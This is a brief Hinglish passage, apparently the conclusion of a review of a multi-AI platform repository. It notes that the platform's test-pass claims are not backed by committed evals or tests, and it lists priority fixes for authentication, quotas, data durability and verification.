- **Sabse important meta-finding:** platform ki saari confidence claims (38/38, 19/19, 8/8) **repo me exist nahi karti**. Ek AI platform jiska koi eval na ho, jiske guards ke tests committed na hon, uska "yeh secure hai" bolna sirf ek blog post hai.
- **Pehla step exactly ek hai:** P0 items 1–6 (≈ 2 din) + item 7 (tests). Uske baad is repo me "multi-AI platform" bolna defensible ho jaayega — kyunki AI layer (router/agent/gateway) already kaafi accha hai; **kamzori AI me nahi, uske gire-duaara me hai: auth, quota, data durability, aur verification.**
